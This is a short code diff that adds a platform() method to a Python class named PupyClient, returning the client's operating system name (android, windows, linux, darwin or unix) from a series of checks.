@@ -78,6 +78,18 @@ class PupyClient(object):
             return True
         return False
 
+    def platform(self):
+        if self.client.is_android():
+            return 'android'
+        elif self.client.is_windows():
+            return 'windows'
+        elif self.client.is_linux():
+            return 'linux'
+        elif self.client.is_darwin():
+            return 'darwin'
+        elif self.client.is_unix():
+            return 'unix'
+
     def is_proc_arch_64_bits(self):
         if "64" in self.desc["proc_arch"]:
             return True
